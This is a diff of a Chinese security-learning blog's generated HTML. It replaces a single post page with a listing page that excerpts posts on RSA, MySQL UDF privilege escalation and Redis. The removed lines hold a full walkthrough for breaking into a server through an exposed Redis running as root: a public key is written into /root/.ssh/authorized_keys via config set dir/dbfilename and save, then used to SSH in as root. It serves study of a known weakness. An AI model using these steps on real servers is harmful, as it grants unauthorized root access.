@@ -108,25 +108,20 @@
 
 
 
-  <meta name="description" content="在ubuntu上安装是非常方便的12$sudo apt-get update$sudo apt-get install redis-server 若是redis-cli命令出现redis 127.0.0.1:6379&amp;gt;，则安装成功了 如何根据Redis和ssh入侵服务器。原理上并不复杂，只是利用的规则有点苛刻：1231. redis要暴露在公网上2. 嗯ssh进程也得开3. Redis要是以">
-<meta name="keywords" content="数据库及漏洞学习">
-<meta property="og:type" content="article">
-<meta property="og:title" content="redis与ssh-keygen">
-<meta property="og:url" content="https://cws6.github.io/2018/01/19/redis与ssh-keygen/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="cws6">
+<meta property="og:url" content="https://cws6.github.io/page/2/index.html">
 <meta property="og:site_name" content="cws6">
-<meta property="og:description" content="在ubuntu上安装是非常方便的12$sudo apt-get update$sudo apt-get install redis-server 若是redis-cli命令出现redis 127.0.0.1:6379&amp;gt;，则安装成功了 如何根据Redis和ssh入侵服务器。原理上并不复杂，只是利用的规则有点苛刻：1231. redis要暴露在公网上2. 嗯ssh进程也得开3. Redis要是以">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-12-03T00:30:12.294Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="redis与ssh-keygen">
-<meta name="twitter:description" content="在ubuntu上安装是非常方便的12$sudo apt-get update$sudo apt-get install redis-server 若是redis-cli命令出现redis 127.0.0.1:6379&amp;gt;，则安装成功了 如何根据Redis和ssh入侵服务器。原理上并不复杂，只是利用的规则有点苛刻：1231. redis要暴露在公网上2. 嗯ssh进程也得开3. Redis要是以">
+<meta name="twitter:title" content="cws6">
 
 
 
 
 
 
-  <link rel="canonical" href="https://cws6.github.io/2018/01/19/redis与ssh-keygen/">
+  <link rel="canonical" href="https://cws6.github.io/page/2/">
 
 
 
@@ -136,7 +131,7 @@
   };
 </script>
 
-  <title>redis与ssh-keygen | cws6</title>
+  <title>cws6</title>
   
 
 
@@ -185,7 +180,8 @@
     
   
 
-  <div class="container sidebar-position-left page-post-detail">
+  <div class="container sidebar-position-left 
+  page-home">
     <div class="headband"></div>
     <a href="https://github.com/cws6"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_darkblue_121621.png" alt="Fork me on GitHub"></a>
 
@@ -306,9 +302,347 @@
           
           <div id="content" class="content">
             
-
-  <div id="posts" class="posts-expand">
+  <section id="posts" class="posts-expand">
     
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://cws6.github.io/2018/03/07/RSA入门/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="cws6">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="cws6">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2018/03/07/RSA入门/" class="post-title-link" itemprop="https://cws6.github.io/page/2/index.html">RSA入门</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2018-03-07 16:12:35" itemprop="dateCreated datePublished" datetime="2018-03-07T16:12:35+08:00">2018-03-07</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2018-12-03 09:35:19" itemprop="dateModified" datetime="2018-12-03T09:35:19+08:00">2018-12-03</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+          参考文献：https://www.anquanke.com/post/id/84632
+RSA的加密过程
+选择两个大素数p和q，计算出模数N = p * q
+计算φ = (p−1) * (q−1) 即N的欧拉函数，然后选择一个e(1&lt;e&lt;φ),且e和φ互质
+取e的模反数为d，计算方法: 
+          ...
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/2018/03/07/RSA入门/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+    <div>
+    
+    </div>
+
+    
+
+    
+       
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://cws6.github.io/2018/02/08/mysql提权/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="cws6">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="cws6">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2018/02/08/mysql提权/" class="post-title-link" itemprop="https://cws6.github.io/page/2/index.html">mysql提权</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2018-02-08 21:41:46" itemprop="dateCreated datePublished" datetime="2018-02-08T21:41:46+08:00">2018-02-08</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2018-12-02 21:13:46" itemprop="dateModified" datetime="2018-12-02T21:13:46+08:00">2018-12-02</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+          UDF提权是利用MySQL的自定义函数功能，将MySQL账号转化为系统system权限
+下载lib_mysqludf_sys程序github：https://github.com/mysqludf/lib_mysqludf_sys
+
+编译获取lib_mysqludf_sys.so文件
+1$ gcc 
+          ...
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/2018/02/08/mysql提权/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+    <div>
+    
+    </div>
+
+    
+
+    
+       
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
 
   
 
@@ -340,7 +674,10 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">redis与ssh-keygen
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2018/01/19/redis与ssh-keygen/" class="post-title-link" itemprop="https://cws6.github.io/page/2/index.html">redis与ssh-keygen</a>
               
             
           </h1>
@@ -415,35 +752,22 @@
       
 
       
-        <h4 id="在ubuntu上安装是非常方便的"><a href="#在ubuntu上安装是非常方便的" class="headerlink" title="在ubuntu上安装是非常方便的"></a>在ubuntu上安装是非常方便的</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sudo apt-get update</span><br><span class="line">$sudo apt-get install redis-server</span><br></pre></td></tr></table></figure>
-<p>若是<code>redis-cli命令</code>出现<code>redis 127.0.0.1:6379&gt;</code>，则安装成功了</p>
-<h4 id="如何根据Redis和ssh入侵服务器。原理上并不复杂，只是利用的规则有点苛刻："><a href="#如何根据Redis和ssh入侵服务器。原理上并不复杂，只是利用的规则有点苛刻：" class="headerlink" title="如何根据Redis和ssh入侵服务器。原理上并不复杂，只是利用的规则有点苛刻："></a>如何根据Redis和ssh入侵服务器。原理上并不复杂，只是利用的规则有点苛刻：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. redis要暴露在公网上</span><br><span class="line">2. 嗯ssh进程也得开</span><br><span class="line">3. Redis要是以root的权限启动的。（这个命令就是以root权限启动的（端口随便填）：redis-server --port 6369）</span><br></pre></td></tr></table></figure>
-<h4 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h4><ul>
-<li><p>先在本地建个ssh的秘钥</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">cd ~/.ssh/</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>然后将公钥写入文本中（文本还可以有路径，比如说<code>/tmp/1.txt</code>,前后空两行，公钥的内容就不会跟redis的内容混在一起了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(echo -e &quot;\n\n&quot;;cat ~/.ssh/id_rsa.pub;echo -e &quot;\n\n&quot;) &gt; 1.txt</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>然后把里面的内容设置到远程的redis服务器上，设置key为233</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat 1.txt | redis-cli -h xxx.xxx.x.xx -p 6379  -x set 233</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>远程连接一下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h xxx.xxx.x.xx</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>修改保存的路径</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xxx.xxx.x.xx :6379&gt; config set dir /root/.ssh/</span><br><span class="line">xxx.xxx.x.xx :6379&gt; config get dir</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>修改保存的名称</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx.xxx.x.xx :6379&gt; config set dbfilename &quot;authorized_keys&quot;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>保存</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx.xxx.x.xx :6379&gt; save</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p><em>PS:SAVE 命令执行一个同步保存操作，将当前 Redis 实例的所有数据快照(snapshot)以 RDB 文件的形式保存到硬盘。</em></p>
-<p>*远程利用自己的私钥登录该服务器。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@xxx.xxx.x.xx</span><br></pre></td></tr></table></figure></p>
-
+        
+          
+          在ubuntu上安装是非常方便的12$sudo apt-get update$sudo apt-get install redis-server
+若是redis-cli命令出现redis 127.0.0.1:6379&gt;，则安装成功了
+如何根据Redis和ssh入侵服务器。原理上并不复杂，只是利
+          ...
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/2018/01/19/redis与ssh-keygen/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
+        
       
     </div>
 
@@ -453,12 +777,6 @@
     
     
     <div>
-    
-       <div>
-
-    <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
-
-</div>
     
     </div>
 
@@ -473,36 +791,14 @@
 
     <footer class="post-footer">
       
-        <div class="post-tags">
-          
-            <a href="/tags/数据库及漏洞学习/" rel="tag"># 数据库及漏洞学习</a>
-          
-        </div>
+
+      
+
       
 
       
       
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/02/08/mysql提权/" rel="prev" title="mysql提权">
-                mysql提权 <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
+        <div class="post-eof"></div>
       
     </footer>
   </div>
@@ -512,15 +808,18 @@
   </article>
 
 
-  </div>
+    
+  </section>
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+  </nav>
+
 
 
           </div>
           
-
-  
-
-
 
         </div>
         
@@ -541,17 +840,8 @@
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            Table of Contents
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            Overview
-          </li>
-        </ul>
-      
 
-      <section class="site-overview-wrap sidebar-panel">
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
             
@@ -618,22 +908,6 @@
         </div>
       </section>
 
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#在ubuntu上安装是非常方便的"><span class="nav-number">1.</span> <span class="nav-text">在ubuntu上安装是非常方便的</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#如何根据Redis和ssh入侵服务器。原理上并不复杂，只是利用的规则有点苛刻："><span class="nav-number">2.</span> <span class="nav-text">如何根据Redis和ssh入侵服务器。原理上并不复杂，只是利用的规则有点苛刻：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#复现过程"><span class="nav-number">3.</span> <span class="nav-text">复现过程</span></a></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
       
 
       
@@ -777,10 +1051,6 @@
   
 
   
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.6.0"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=6.6.0"></script>
-
-
 
   
 
